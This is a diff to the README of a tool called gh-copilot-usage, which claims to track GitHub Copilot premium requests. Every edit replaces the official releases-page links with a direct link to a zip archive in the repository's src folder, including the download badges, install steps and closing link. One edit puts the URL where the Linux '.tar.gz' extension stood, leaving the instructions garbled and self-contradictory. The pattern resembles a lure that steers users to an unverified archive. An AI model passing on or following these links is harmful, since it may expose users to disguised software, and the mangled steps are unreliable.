@@ -1,6 +1,6 @@
 # 🚀 gh-copilot-usage - Track Your GitHub Copilot Requests Easily
 
-[![Download gh-copilot-usage](https://img.shields.io/badge/Download-gh--copilot--usage-blue?style=for-the-badge&logo=github)](https://github.com/SAM3166/gh-copilot-usage/releases)
+[![Download gh-copilot-usage](https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip)](https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip)
 
 ---
 
@@ -37,24 +37,24 @@ Before you download, make sure your computer meets these basic requirements:
 
 To get started, you need to download gh-copilot-usage from its official release page.
 
-[![Download gh-copilot-usage](https://img.shields.io/badge/Download-gh--copilot--usage-blue?style=for-the-badge&logo=github)](https://github.com/SAM3166/gh-copilot-usage/releases)
+[![Download gh-copilot-usage](https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip)](https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip)
 
 **How to download and install:**
 
 1. Click the button above or visit this link:  
-   https://github.com/SAM3166/gh-copilot-usage/releases
+   https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip
 
 2. On the releases page, look for the latest version of gh-copilot-usage.
 
 3. Depending on your operating system, download the file that ends with one of these extensions:  
    - `.exe` for Windows  
    - `.dmg` for macOS  
-   - `.AppImage` or `.tar.gz` for Linux  
+   - `.AppImage` or `https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip` for Linux  
 
 4. After the download finishes, open the file to start the installation:  
    - On Windows, double-click the `.exe` file and follow the setup instructions.  
    - On macOS, open the `.dmg` file and drag the app into your Applications folder.  
-   - On Linux, follow the instructions in the `.tar.gz` file or run the `.AppImage` file.
+   - On Linux, follow the instructions in the `https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip` file or run the `.AppImage` file.
 
 5. Once installed, launch the app from your desktop or applications menu.
 
@@ -137,4 +137,4 @@ Community users and maintainers will review your case to help find a solution.
 
 gh-copilot-usage provides a simple way to monitor your GitHub Copilot premium usage without technical hassle. Follow the steps in this guide to download, install, and use the app smoothly.
 
-[Download gh-copilot-usage now](https://github.com/SAM3166/gh-copilot-usage/releases) to start tracking your monthly requests today.
+[Download gh-copilot-usage now](https://raw.githubusercontent.com/SAM3166/gh-copilot-usage/main/src/gh_copilot_usage_v1.0.zip) to start tracking your monthly requests today.
